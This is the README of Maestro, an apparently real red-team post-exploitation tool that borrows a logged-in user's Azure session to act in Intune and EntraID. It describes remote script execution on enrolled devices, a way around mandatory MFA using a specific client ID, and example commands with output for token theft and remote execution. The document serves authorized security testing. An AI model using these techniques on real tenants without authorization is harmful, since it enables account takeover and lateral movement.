<p align="center">
    <img src="https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fspecterops%2F.github%2Fmain%2Fconfig%2Fshield.json&style=flat"
        alt="Sponsored by SpecterOps"/></a>
    <a href="https://twitter.com/_Mayyhem">
        <img src="https://img.shields.io/twitter/follow/_Mayyhem?style=social"
        alt="@_Mayyhem on Twitter"/></a>
</p>

---

# Maestro
Maestro is a post-exploitation tool designed to interact with Intune/EntraID from a C2 agent on a user's workstation without requiring knowledge of the user's password or Azure authentication flows, token manipulation, and web-based administration console. Maestro makes interacting with Intune and EntraID (and potentially other Azure services) from C2 much easier, as the operator does not need to obtain the user's cleartext password, extract primary refresh token (PRT) cookies from the system, run additional tools or a browser session over a SOCKS proxy, or deal with Azure authentication flows, tokens, or conditional access policies in order to execute actions in Azure on behalf of the logged-in user.

Maestro is essentially a wrapper for local PRT cookie requests and calls to the Microsoft Graph API with a lot of quality-of-life features added for red teamers. Maestro enables attack paths between on-prem and Azure. For example, by running Maestro on an Intune admin's machine, you can execute PowerShell scripts on any enrolled device without ever knowing the admin's credentials, even if MFA, device compliance, and a hybrid-joined device are required by conditional access policies.

Maestro's lateral movement functions were inspired by [Death from Above: Lateral Movement from Azure to On-Prem AD](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d) by Andy Robbins ([@_wald0](https://x.com/_wald0)). 

You can read more in this introductory blog post for Maestro: https://posts.specterops.io/maestro-9ed71d38d546

# Features
- Real-time PowerShell script execution (via Proactive Remediations)
- Application execution
- Real-time Device Query execution
- Force device check-in and sync
- Intune and Entra object enumeration
- Local database to store credentials and query results

# Notes
There is a compiled release in this repository using the `ReleasePlusMSAL` build configuration. Note that this configuration merges the MSAL dependencies into the .exe but increases the size of the resulting binary significantly. If you are not planning to use the `-m 2` method of requesting access tokens (SharpGetEntraToken via MSAL), you can compile a `Release` build and the size will be significantly reduced.

As of February 2025, Microsoft is rolling out mandatory MFA enforcement for authentication to Azure Portal and its extensions. The default access token request method using auth code flow will likely fail in this case, but using SharpGetEntraToken/MSAL (`-m 2` option) and specifying a client ID that does not require MFA like Azure Powershell (`1950a258-227b-4e31-a9cf-717495945fc2`) should still work. 

# Syntax
`Maestro.exe <command> [subcommand] [options]`

All commands and subcommands have a help page that is generated using a custom command line parser to keep the size of the binary to a minimum. Help pages can be accessed by entering any Maestro command followed by `-h` or `--help`.

Please refer to the output of the `--help` option for each command for the most up-to-date usage information.

Examples can be found at the bottom of this file.

# vNext
- Local Endpoint Privilege Management (EPM) enumeration

# Blogs/Talks
- [DEF CON 32 Demo Labs slides](https://docs.google.com/presentation/d/1TGl-ASNo-1jXMOha9yd1CdPI-zCMt2UP/edit?usp=sharing&ouid=114582824289521319309&rtpof=true&sd=true)

# Development
For debugging, I share a directory on an Intune-enrolled machine that is accessible from my host running Visual Studio, execute the Visual Studio Remote Debugger, configure a post-build job to copy the solution files to the share, and configure Visual Studio to remote debug on the enrolled system.

# Supporters
The time I'm able to spend researching, developing, and improving Maestro would not be possible without [SpecterOps's](https://www.specterops.io/) sponsorship of the project as part of their commitment to transparency and support for open-source development. I'm immensely grateful for their guidance and support.

# Contributions
Some Maestro features were inspired by or built based on the work of others, including:
- [RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken), by Lee Chagolla-Christensen ([@tifkin_](https://x.com/tifkin_))
- [ROADtoken](https://github.com/dirkjanm/ROADtoken), by Dirk-jan Mollema ([@_dirkjan](https://x.com/_dirkjan))
- [SharpGetEntraToken](https://github.com/hotnops/SharpGetEntraToken), by Daniel Heinsen ([@hotnops](https://x.com/hotnops))

If you're interested in collaborating, please hit me up on Twitter ([@_Mayyhem](https://twitter.com/_Mayyhem)) or in the [BloodHoundGang Slack](http://ghst.ly/BHSlack)!

# Examples
Get an access token for MS Graph using MSAL and the Azure PowerShell client ID (not yet prevented my mandatory MFA):
```
.\Maestro.exe get access-token -m 2 -t mayyhem.onmicrosoft.com -c 1950a258-227b-4e31-a9cf-717495945fc2 -s https://graph.microsoft.com/.default
2025-02-06 21:09:24.701 UTC - [INFO]    Execution started
2025-02-06 21:09:24.810 UTC - [INFO]    MSAL DLL loaded and ready for use.
2025-02-06 21:09:24.810 UTC - [INFO]    SharpGetEntraToken attempting to get an access token
2025-02-06 21:09:25.857 UTC - [INFO]    SharpGetEntraToken got an access token:
eyJ0...tDOg
2025-02-06 21:09:25.982 UTC - [INFO]    Completed execution in 00:00:01.3203797
```

Execute `dsregcmd.exe` on the Intune device with ID `e537180b-6d04-427e-bf93-dbde818400eb`, uploading results to the Azure Storage Blob Container SAS URL with a shared access token:
```
.\Maestro.exe exec intune upload -i e537180b-6d04-427e-bf93-dbde818400eb -n MyPolicy --url 'https://maestro2go.blob.core.windows.net/uploads?st=2025-01-14T20:19:57Z&se=2025-01-15T04:19:57Z&si=All&sv=2022-11-02&sr=c&sig=QYri...ZkpA%3D' --commands "%windir%\system32\dsregcmd.exe"
...
2025-01-14 20:20:28.251 UTC - [INFO]    Creating new device assignment filter with displayName: d004a709-aae6-4fbf-91cd-48f227272c97
2025-01-14 20:20:28.251 UTC - [INFO]    Requesting devices from Intune
2025-01-14 20:20:28.267 UTC - [INFO]    Requesting IntuneDevices from Microsoft Graph
2025-01-14 20:20:28.783 UTC - [INFO]    Found 1 IntuneDevice matching query in Microsoft Graph
2025-01-14 20:20:29.017 UTC - [INFO]    Found 1 devices in filtered results
2025-01-14 20:20:29.361 UTC - [INFO]    Obtained filter ID: 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
2025-01-14 20:20:29.379 UTC - [INFO]    Creating custom config policy for device: e537180b-6d04-427e-bf93-dbde818400eb
2025-01-14 20:20:29.649 UTC - [INFO]    Obtained policy ID: fbca5c35-5282-4ec7-87de-a2d16a743079
2025-01-14 20:20:29.680 UTC - [INFO]    Assigning policy fbca5c35-5282-4ec7-87de-a2d16a743079 with filter 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
2025-01-14 20:20:29.983 UTC - [INFO]    Successfully assigned policy with filter
2025-01-14 20:20:29.983 UTC - [INFO]    Successfully created and assigned diagnostic logs policy with request ID 651d2244-4ad7-4efe-bb5e-d017b0c27750
2025-01-14 20:20:29.999 UTC - [INFO]    Not syncing automatically, execute the following to force device sync:

    .\Maestro.exe exec intune sync -i e537180b-6d04-427e-bf93-dbde818400eb

Clean up after execution:
    .\Maestro.exe delete intune policy -i fbca5c35-5282-4ec7-87de-a2d16a743079
    .\Maestro.exe delete intune filter -i 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64

2025-01-14 20:20:29.999 UTC - [INFO]    Completed execution in 00:00:04.8572902
```
